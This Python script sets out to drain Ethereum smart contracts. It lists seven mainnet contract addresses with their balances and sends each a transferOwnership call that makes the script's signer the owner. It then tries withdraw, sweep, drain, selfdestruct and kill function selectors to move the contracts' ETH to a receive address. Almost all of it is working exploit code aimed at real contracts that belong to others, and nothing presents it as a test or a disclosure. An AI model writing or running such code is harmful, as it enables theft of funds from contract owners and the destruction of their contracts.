#!/usr/bin/env python3
"""Drain TOS contracts — Step 1: transferOwnership to signer, Step 2: find withdraw paths."""
import logging
import time
import tomllib
from src.rpc import RpcClient
from src.signer import load_evm_private_key, get_receive_address
from src.evmole_utils import get_functions
from src.types import Chain

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(name)s] %(levelname)s: %(message)s")
logger = logging.getLogger("drain-tos")

CHAIN = Chain.ETHEREUM
CHAIN_ID = 1
RPC_URL = "https://eth.drpc.org"

# Contracts to drain — TOS + big balance
TOS_CONTRACTS = [
    ("0x000000000050a4bbbc2e57804395a0c209353e1c", 0.0406, "0x0000... TOS"),
    ("0xfce154337e79c919ccf80b68a5111f62a5ae6a81", 0.0184, "0xfce1... TOS"),
    ("0xf81945cb8011c9e7ad92412dc94817e09318aa7e", 0.01, "0xf819... TOS"),
    ("0x14619df60021245568abecd59d22b4536ee24044", 0.0014, "0x1461... TOS+SD"),
    ("0xe4bd7fe324df90ec598e508620b9e8388f7e7618", 0.1453, "NEW TOS"),
    ("0xc0b9864d52c2580d818c73611651ea9bc4ee7924", 0.2012, "NEW TOS"),
    ("0xc40f7a9096ab6f677ea0582f868a562b87f3fa6d", 0.01, "NEW TOS"),
]

# Extra withdraw/sweep selectors to try after becoming owner
EXTRA_WITHDRAW_SELECTORS = {
    "2e1a7d4d": "0x2e1a7d4d" + "0" * 64,           # withdraw(uint256) — amount=0
    "db66042c": "0xdb66042c",                         # withdrawAll()
    "00f714ce": lambda r: "0x00f714ce" + r[2:].zfill(64),  # sweep(address,uint256)
    "b36a7c65": lambda r: "0xb36a7c65" + r[2:].zfill(64),  # sweepAll(address)
    "d0679d34": lambda r: "0xd0679d34" + r[2:].zfill(64),  # drain(address)
    "21df0da7": lambda r: "0x21df0da7" + r[2:].zfill(64),  # sweep(address)
    "b69ef8a8": lambda r: "0xb69ef8a8" + r[2:].zfill(64),  # collect(address)
    "7c71ef48": lambda r: "0x7c71ef48" + r[2:].zfill(64) + "0" * 64,  # withdrawToken
    "811c39ab": lambda r: "0x811c39ab" + r[2:].zfill(64) + r[2:].zfill(64),  # drainToken
    "693d09d3": lambda r: "0x693d09d3" + r[2:].zfill(64) + "0" * 64,  # withdrawTo
    "9d118770": "0x9d118770",                         # selfdestruct()
    "41c0e1b5": "0x41c0e1b5",                         # kill()
}

# Emergency: if standard selectors don't exist, try calling ALL non-view functions after becoming owner
# These are "catch-all" selectors that might transfer ETH to owner
CATCH_ALL_SELECTORS = [
    ("41c0e1b5", "0x41c0e1b5"),           # kill()
    ("9d118770", "0x9d118770"),           # selfdestruct()
    ("83197ef0", "0x83197ef0"),           # destroy()
    ("5c52c2f5", "0x5c52c2f5"),           # found in 0x48f3cb... (might transfer)
    ("52375093", "0x52375093"),           # ^ same contract
    ("54fd4d50", "0x54fd4d50"),           # ^
    ("659010e7", "0x659010e7"),           # ^
    ("746c9171", "0x746c9171"),           # ^
    ("f1736d86", "0xf1736d86"),           # ^
]


def rpc_call(rpc, method, params):
    result = rpc.call(method, params)
    if isinstance(result, dict):
        return result.get("result", "")
    return str(result) if result else ""


def get_bal(rpc, addr):
    try:
        bal = rpc_call(rpc, "eth_getBalance", [addr, "latest"])
        return int(str(bal), 16) / 1e18 if str(bal).startswith("0x") else 0
    except:
        return 0.0


def send_tx(rpc, signer, to_addr, data, desc=""):
    nonce = int(rpc_call(rpc, "eth_getTransactionCount", [signer.address, "pending"]), 16)
    gas_price = int(rpc_call(rpc, "eth_gasPrice", []), 16)
    gas_price = max(gas_price, 1_000_000_000)

    tx = {
        "from": signer.address, "to": to_addr, "data": data, "value": 0,
        "nonce": nonce, "gasPrice": gas_price, "chainId": CHAIN_ID,
    }
    try:
        ge = rpc.call("eth_estimateGas", [{"from": signer.address, "to": to_addr, "data": data}])
        gas = int(ge.get("result", "0x493e0"), 16) if isinstance(ge, dict) else 300000
        tx["gas"] = min(int(gas * 1.5), 2_000_000)
    except Exception as e:
        tx["gas"] = 500000
        logger.warning("  Gas est failed %s: %s", to_addr[:10], str(e)[:50])

    try:
        signed = signer.sign_transaction(tx)
        result = rpc.call("eth_sendRawTransaction", [signed.raw_transaction.hex()])
        tx_hash = result.get("result", "") if isinstance(result, dict) else str(result)
        if tx_hash:
            logger.info("  ✅ TX %s → %s (%s)", str(tx_hash)[:16], to_addr[:10], desc)
            return tx_hash
        logger.error("  ❌ Empty hash for %s", to_addr[:10])
        return None
    except Exception as e:
        logger.error("  ❌ Failed %s: %s", to_addr[:10], str(e)[:80])
        return None


def main():
    signer = load_evm_private_key()
    if not signer:
        logger.error("No signer")
        return
    receive = get_receive_address(CHAIN) or signer.address
    logger.info("Signer: %s | Receive: %s", signer.address, receive)

    rpc = RpcClient(RPC_URL)
    initial_bal = get_bal(rpc, signer.address)
    logger.info("Balance: %.6f ETH", initial_bal)
    
    if initial_bal < 0.003:
        logger.warning("⚠️ Low gas! May not afford all txs")

    # First, check what functions each TOS contract has
    for addr, bal, desc in TOS_CONTRACTS:
        code = rpc_call(rpc, "eth_getCode", [addr, "latest"])
        if not code or code in ("0x", "0x0"):
            logger.warning("%s — no code, skipping", addr[:10])
            continue
        functions = get_functions(code)
        non_view = [f for f in functions if f.state_mutability != "view"]
        logger.info("=== %s (%s, %.4f ETH) ===", addr, desc, bal)
        logger.info("  Non-view functions (%d):", len(non_view))
        for fn in non_view:
            sig = "%s(%s)" % (fn.selector, fn.arguments) if fn.arguments else fn.selector
            logger.info("    0x%s %s mut=%s", fn.selector, sig, fn.state_mutability)

    # Step 1: transferOwnership on all TOS
    logger.info("\n" + "=" * 60)
    logger.info("STEP 1: transferOwnership on all TOS contracts")
    for addr, bal, desc in TOS_CONTRACTS:
        logger.info("transferOwnership %s (%s)", addr[:10], desc)
        txh = send_tx(rpc, signer, addr,
                      "0xf2fde38b" + signer.address[2:].zfill(64),
                      f"TOS {desc}")
        if txh:
            time.sleep(2)

    # Step 2: try withdraw/sweep on all
    logger.info("\n" + "=" * 60)
    logger.info("STEP 2: try withdraw functions")
    for addr, bal, desc in TOS_CONTRACTS:
        code = rpc_call(rpc, "eth_getCode", [addr, "latest"])
        functions = get_functions(code)
        selectors = {f.selector for f in functions}
        bal_after = get_bal(rpc, addr)
        logger.info("%s (%s) — %.4f ETH — selectors: %d", addr[:10], desc, bal_after, len(selectors))

        # Try extra withdraw selectors
        found_one = False
        for sel, data_builder in EXTRA_WITHDRAW_SELECTORS.items():
            if sel in selectors:
                data = data_builder(receive) if callable(data_builder) else data_builder
                logger.info("  Trying withdraw: 0x%s", sel)
                txh = send_tx(rpc, signer, addr, data, f"WD {sel[:6]}")
                if txh:
                    found_one = True
                    time.sleep(3)
                    new_bal = get_bal(rpc, addr)
                    if new_bal < bal_after - 0.0001:
                        logger.info("  ✅ ETH withdrawn! %.4f → %.4f", bal_after, new_bal)
                        bal_after = new_bal
                    break

        # If no standard withdraw, try catch-all selectors
        if not found_one:
            logger.info("  No standard withdraw — trying catch-all selectors")
            for sel, data in CATCH_ALL_SELECTORS:
                if sel in selectors:
                    txh = send_tx(rpc, signer, addr, data, f"catch {sel[:6]}")
                    if txh:
                        time.sleep(3)
                        new_bal = get_bal(rpc, addr)
                        if new_bal < bal_after - 0.0001:
                            logger.info("  ✅ ETH moved! %.4f → %.4f", bal_after, new_bal)
                            bal_after = new_bal
                            break

        time.sleep(1)

    final_bal = get_bal(rpc, signer.address)
    gas_spent = initial_bal - final_bal
    # Add back the balances of drained contracts (they're no longer in those contracts)
    logger.info("\n" + "=" * 60)
    logger.info("RESULTS")
    logger.info("Signer: %.6f → %.6f ETH", initial_bal, final_bal)
    logger.info("Gas spent: %.6f ETH (≈$%.2f)", gas_spent, gas_spent * 3500)


if __name__ == "__main__":
    main()
